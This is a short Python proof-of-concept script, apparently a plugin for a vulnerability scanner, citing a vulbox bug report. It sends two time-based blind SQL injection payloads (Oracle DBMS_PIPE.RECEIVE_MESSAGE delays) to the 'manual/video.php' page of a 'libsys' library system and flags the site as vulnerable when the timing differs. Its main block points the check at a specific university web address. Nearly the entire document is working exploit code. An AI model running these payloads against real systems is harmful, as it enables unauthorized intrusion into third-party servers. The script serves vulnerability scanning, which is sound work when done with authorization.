#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:https://www.vulbox.com/bugs/vulbox-2016-016871

import time

def assign(service, arg):
    if service == "libsys":
        return True, arg

def audit(arg):
    payload1 = "manual/video.php?type=123%27%20AND%205854%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2889%29%7C%7CCHR%2883%29%7C%7CCHR%2865%29%2C0%29--&_SESSION[MANULA_SESSION_WKR]=wkr "
    payload2 = "manual/video.php?type=123%27%20AND%205854%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2889%29%7C%7CCHR%2883%29%7C%7CCHR%2865%29%2C5%29--&_SESSION[MANULA_SESSION_WKR]=wkr "
    t1 = time.time()
    code1, head, res, err, _ = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head, res, err, _ = curl.curl2(arg+payload2)
    t3 = time.time()
    if code1 == 200 and code2 == 200 and t3 - 2*t2+t1 > 3:
        security_hole(arg+payload1+"  :sql Injection")
           
if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://tsjs.cxxy.seu.edu.cn/')[1])
    